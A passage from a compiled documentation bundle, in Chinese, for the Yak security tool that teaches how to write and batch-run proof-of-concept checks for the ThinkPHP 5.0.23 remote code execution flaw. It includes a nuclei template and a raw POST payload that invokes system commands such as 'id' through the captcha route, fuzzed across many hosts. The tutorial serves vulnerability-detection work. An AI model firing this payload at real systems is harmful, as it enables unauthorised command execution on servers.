re.Match(`((uid\\=\\d*)|(gid\\=\\d*)|(groups=\\d*))`, rsp.ResponseRaw) {\n        println("found thinkphp vuls...")\n        break\n    }\n}\n')),(0,o.kt)("p",null,"\u901a\u8fc7\u4e0a\u8ff0\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u77e5\u9053\u539f\u59cb\u6570\u636e\u5305\u662f\u5565\u3002\u901a\u5e38\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u628a ",(0,o.kt)("inlineCode",{parentName:"p"},"Burpsuite")," \u7684\u6570\u636e\u5305\u76f4\u63a5\u590d\u5236\u5728\u8fd9\u91cc\uff0c\u7136\u540e\u76f4\u63a5\u7f16\u5199\u9700\u8981\u68c0\u6d4b\u7684\u6b63\u5219\u5373\u53ef\u3002"),(0,o.kt)("div",{className:"admonition admonition-caution alert alert--warning"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 16 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"}))),"caution")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"\u539f\u59cb\u6570\u636e\u5305\u5c06\u4f1a\u81ea\u52a8\u4fee\u590d\u4e00\u4e9b\u53ef\u80fd\u7684\u9519\u8bef\uff0c\u6bd4\u5982\u8bf4\u6570\u636e\u5305\u524d\u7684\u7a7a\u884c\uff0c\u81ea\u52a8\u4fee\u6b63 Content-Length\uff0c\u6839\u636e Host \u542f\u52a8\u63d0\u53d6\u9700\u8981\u8bbf\u95ee\u7684\u76ee\u6807\u3002"),(0,o.kt)("p",{parentName:"div"},"\u6240\u4ee5\u7528\u6237\u4e0d\u5fc5\u4e25\u683c\u8ffd\u53bb\u6570\u636e\u5305\u7684\u683c\u5f0f\u5fc5\u987b\u600e\u4e48\u6837\uff0cYak \u7684 ",(0,o.kt)("inlineCode",{parentName:"p"},"fuzz")," \u80fd\u81ea\u52a8\u4fee\u6b63\u4e00\u90e8\u5206\u6570\u636e\u5305\u7684\u9519\u8bef"))),(0,o.kt)("h3",{id:"\u4f7f\u7528-nuclei-\u7f16\u5199-poc"},"\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"h3"},"nuclei")," \u7f16\u5199 PoC"),(0,o.kt)("p",null,"\u5982\u679c\u662f\u62c5\u5fc3 Yak \u7f16\u5199 PoC \u4f1a\u5e76\u4e0d\u90a3\u4e48\u901a\u7528\uff0c\u6216\u8005 Yak \u7684\u5206\u4eab\u6e20\u9053\u5e76\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u7684\u9700\u6c42\uff0c\u90a3\u4e48\u7528\u6237\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"p"},"nuclei")," \u7684 PoC \u7f16\u5199"),(0,o.kt)("p",null,"\u6211\u4eec\u76f4\u63a5\u4f7f\u7528"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go"},'res, err := nuclei.Scan("http://127.0.0.1:8080", nuclei.tags("thinkphp"))\ndie(err)\nfor r := range res {\n   dump(r)\n}\n')),(0,o.kt)("p",null,"\u5373\u53ef\u8c03\u7528\u5230\u6211\u4eec\u8bbe\u7f6e\u4e86\u76f8\u5e94 Tag \u7684 PoC\u3002",(0,o.kt)("a",{parentName:"p",href:"https://github.com/projectdiscovery/nuclei-templates/blob/3ef39c173e4cc1937158c6ad9ab30d2f2e7366d1/vulnerabilities/thinkphp/thinkphp-5023-rce.yaml"},(0,o.kt)("inlineCode",{parentName:"a"},"nuclei-templates")," \u4e2d Thinkphp \u7684 PoC")),(0,o.kt)("p",null,"PoC \u6837\u4f8b\u5982\u4e0b\uff1a"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yaml"},'id: thinkphp-5023-rce\n\ninfo:\n  name: ThinkPHP 5.0.23 RCE\n  author: dr_set\n  severity: critical\n  description: Thinkphp5 5.0(<5.0.24) Remote Code Execution.\n  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce\n  tags: thinkphp,rce\n\nrequests:\n  - method: POST\n    path:\n      - "{{BaseURL}}/index.php?s=captcha"\n    headers:\n      Content-Type: application/x-www-form-urlencoded\n    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"\n    matchers-condition: and\n    matchers:\n      - type: word\n        words:\n          - "PHP Extension"\n          - "PHP Version"\n        condition: and\n      - type: status\n        status:\n          - 200\n')),(0,o.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"tip")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"\u5982\u679c\u5927\u5bb6\u60f3\u8981\u5bfb\u627e\u5982\u4f55\u7f16\u5199\u4e00\u4e2a Nuclei Yaml PoC\uff0c",(0,o.kt)("a",{parentName:"p",href:"https://nuclei.projectdiscovery.io/templating-guide/"},"\u6559\u7a0b\u5728\u8fd9\u91cc")))),(0,o.kt)("h2",{id:"\u6f0f\u6d1e-poc-\u89c4\u6a21\u5316\u6b66\u5668\u5316"},"\u6f0f\u6d1e PoC ",(0,o.kt)("inlineCode",{parentName:"h2"},"\u89c4\u6a21\u5316/\u6b66\u5668\u5316")),(0,o.kt)("p",null,"\u6211\u4eec\u901a\u8fc7\u4e0a\u9762\u7684\u7b80\u5355\u6559\u7a0b\uff0c\u5b66\u4f1a\u4e86\u5982\u4f55\u7f16\u5199\u4e00\u4e2a Yak/Nuclei \u7248\u672c\u7684 PoC\uff0c\u4f46\u662f\u6211\u4eec\u53d1\u73b0\uff0c\u4e0a\u8ff0\u7684\u4ee3\u7801\u5176\u5b9e\u5e76\u4e0d\u662f\u7279\u522b\u53ef\u7528\u3002\u4e3b\u8981\u539f\u56e0\u6709\u4e0b\u9762\u51e0\u4e2a\uff1a"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"\u6211\u4eec\u7684\u76ee\u6807\u7279\u522b\u591a\u600e\u4e48\u529e\uff1f "),(0,o.kt)("li",{parentName:"ol"},"\u6211\u4eec\u6709\u4e9b\u53c2\u6570\u9700\u8981\u52a8\u6001\u5316\u600e\u4e48\u529e\uff1f"),(0,o.kt)("li",{parentName:"ol"},"\u7528\u6237\u5982\u679c\u53ea\u8f93\u5165\u4e86\u4e00\u4e2a\u76f2\u76ee\u7684\u7f51\u7ad9 IP + \u7aef\u53e3\u600e\u4e48\u529e\uff1f"),(0,o.kt)("li",{parentName:"ol"},"...")),(0,o.kt)("p",null,"\u6211\u4eec\u53d1\u73b0\uff0c\u5982\u679c\u60f3\u8981\u8ba9\u8fd9\u4e2a PoC \u5c3d\u53ef\u80fd\u771f\u7684\u80fd\u626b\u5230\u76ee\u6807\uff0c\u5176\u5b9e\u6211\u4eec\u8981\u505a\u7684\u4e8b\u60c5\uff0c\u4e5f\u5e76\u4e0d\u5c11\u3002"),(0,o.kt)("h3",{id:"\u56de\u987e\u4e00\u4e0b\u6211\u4eec\u5728-fuzz-\u4e2d\u5b66\u4e60\u7684\u6280\u80fd"},"\u56de\u987e\u4e00\u4e0b\u6211\u4eec\u5728 ",(0,o.kt)("inlineCode",{parentName:"h3"},"fuzz")," \u4e2d\u5b66\u4e60\u7684\u6280\u80fd"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go"},"fReq, err := fuzz.HTTPRequest(`\nPOST /index.php?s=captcha HTTP/1.1\nHost: localhost:8080\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 72\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\n`)\nif err != nil {\n    die(err)\n}\n")),(0,o.kt)("p",null,"\u5f53\u6211\u4eec\u6784\u5efa\u4e86\u4e00\u4e2a\u53ef\u4f9b Fuzz \u7684\u8bf7\u6c42\u4e4b\u540e\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u5bf9\u8fd9\u4e2a\u8bf7\u6c42\u8fdb\u884c\u53d8\u5f62\uff1a"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"\u5982\u679c\u8981\u8c03\u6574\u4ed6\u7684\u626b\u63cf\u76ee\u6807\uff0c\u6211\u4eec\u5c31 ",(0,o.kt)("inlineCode",{parentName:"li"},'.FuzzHTTPHeader("Host", targets)')," \u66ff\u6362\u6389 Host\u3002"),(0,o.kt)("li",{parentName:"ol"},"\u5982\u679c\u8bf4\u6211\u4eec\u8981\u8c03\u6574 Payload\uff0c\u5c31 ",(0,o.kt)("inlineCode",{parentName:"li"},'.FuzzPostParams("server[REQUEST_METHOD]", ["id", "uname"])')," \u66f4\u65b0\u60f3\u8981\u6267\u884c\u7684\u547d\u4ee4\u3002")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go"},'rsp, err := fReq.FuzzHTTPHeader("Host", sprintf("{{net(%v)}}:{{port(%v)}}", host, port)).FuzzPostParams("server[REQUEST_METHOD]", ["id", "uname"]).Exec()\ndie(err)\n')),(0,o.kt)("p",null,"\u6240\u4ee5\uff0c\u6211\u4eec\u5bf9\u8fd9\u4e2a Payload \u8fdb\u884c\u4e86 Fuzz\uff0c\u540c\u65f6\u66ff\u6362\u4e86\u4e00\u4e9b\u5173\u952e\u7684\u53c2\u6570"),(0,o.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"tip")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"\u8fd9\u4e48\u505a\u7684\u597d\u5904\u4e0d\u8a00\u800c\u55bb\uff0c\u6211\u4eec\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"p"},"fuzz")," \u6a21\u5757\uff0c\u53ef\u4ee5\u505a\u5230\u5c3d\u91cf\u5c11\u4fee\u6539 PoC \u6e90\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u5916\u90e8\u4fee\u6539\u8bf7\u6c42\u53c2\u6570\u4ece\u800c\u8fbe\u5230\u4fee\u6539\u6700\u7ec8\u53d1\u51fa\u7684\u6570\u636e\u5305\u7684\u76ee\u7684\u3002"))),(0,o.kt)("h3",{id:"\u5176\u6b21\u6211\u4eec\u89e3\u51b3\u6279\u91cf\u8c03\u7528\u7684\u95ee\u9898\uff0c\u51fd\u6570\u5316\u6a21\u5757\u5316"},"\u5176\u6b21\u6211\u4eec\u89e3\u51b3\u6279\u91cf\u8c03\u7528\u7684\u95ee\u9898\uff0c\u51fd\u6570\u5316+\u6a21\u5757\u5316"),(0,o.kt)("p",null,"\u51fd\u6570/\u6a21\u5757\u5316\u6211\u4eec\u9700\u8981\u7528\u5230\u7684\u6838\u5fc3\u529f\u80fd\u662f ",(0,o.kt)("a",{parentName:"p",href:"/docs/basic#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0-import%EF%BC%9A%E5%8A%A0%E8%BD%BD%E5%8F%A6%E5%A4%96%E7%9A%84%E8%84%9A%E6%9C%AC%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E3%80%82"},"Yak \u4e2d\u7684 ",(0,o.kt)("inlineCode",{parentName:"a"},"import")," \u51fd\u6570")," "),(0,o.kt)("p",null,"\u6839\u636e\u6211\u4eec\u7684 ",(0,o.kt)("inlineCode",{parentName:"p"},"import")," \u7684\u5168\u5c40\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u6211\u4eec\u7684\u4ee3\u7801\uff0c\u5c01\u88c5\u6210\u4e3a\u4e00\u4e2a\u53ef\u4f9b\u522b\u7684\u811a\u672c\u8c03\u7528\u7684\u51fd\u6570\uff0c\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"p"},"cli")," \u6765\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u53c2\u6570\u3002"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-go",metastring:'title="thinkphp-poc.yak"',title:'"thinkphp-poc.yak"'},'def poc(host, port) {\n   fReq, err := fuzz.HTTPRequest(`\n   POST /index.php?s=captcha HTTP/1.1\n   Host: localhost:8080\n   User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n   Connection: close\n   Content-Type: application/x-www-form-urlencoded\n   Content-Length: 72\n   \n   _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\n   `)\n   if err != nil {\n       log.error(err)\n       return false\n   }\n   \n   rsp, err := fReq.FuzzHTTPHeader("Host", sprintf("{{net(%v)}}:{{port(%v)}}", host, port)).FuzzPostParams("server[REQUEST_METHOD]", ["id", "uname"]).Exec()\n   if err != nil {\n      log.error(err)\n      return false\n   }\n   \n   // match result\n   // \n   //  DO Something\n   return true\n}\n\nif YAK_MAIN {\n   poc(cli.String("target"), cli.String("port"))\n}\n')),(0,o.kt)("p",null,"\u6211\u4eec\u901a\u8fc7\u4e0a\u8ff0\u7b80\u5355\u7684\u5904\u7406\uff0c\u5c31\u53ef\u4ee5\u505a\u5230\u5c01\u88c5\u4e00\u4e2a PoC\uff0c\u4efb\u4f55 Yak \u811a\u672c\u90fd\u53ef\u4ee5\u901a\u8fc7 ",(0,o.kt)("inlineCode",{parentName:"p"},'import("thinkphp-poc", "poc")')," \u6765\u5bfc\u5165\u6267\u884c\u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5\u6267\u884c\u4e0a\u8ff0\u51fd\u6570\u3002"),(0,o.kt)("p",null,"\u540c\u65f6\u7531\u4e8e\u6211\u4eec\u4f7f\u7528 ",(0,o.kt)("inlineCode",{parentName:"p"},"fuzz")," \u6a21\u5757\u53bb\u6a21\u7cca\u5316\u4e86 ",(0,o.kt)("inlineCode",{parentName:"p"},"Host")," \u6211\u4eec\u53ef\u4ee5\u5f88\u8f7b\u6613\u5b9e\u73b0\u9488\u5bf9\u591a\u4e2a\u76ee\u6807\u540c\u65f6\u8fdb\u884c\u626b\u63cf\u3002"),(0,o.kt)("h2",{id:"\u7ed3\u8bed"},"\u7ed3\u8bed"),(0,o.kt)("p",null,"\u6211\u4eec\u5e0c\u671b\u7f16\u5199 Yak PoC \u662f\u4e00\u4e2a\u5305\u5bb9\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u4e0d\u4f1a\u9650\u5236\u7528\u6237\u7684\u683c\u5f0f\uff0c\u4e5f\u4e0d\u9700\u8981\u7528\u6237\u81ea\u5df1\u53bb\u505a\u590d\u6742\u7684\u4f9d\u8d56\u7ba1\u7406\uff0c\u9075\u5faa Yak \u7684\u8bed\u6cd5\u5373\u53ef\u3002"),(0,o.kt)("p",null,"\u603b\u4e4b Happy Game!"))}s.isMDXComponent=!0}}]);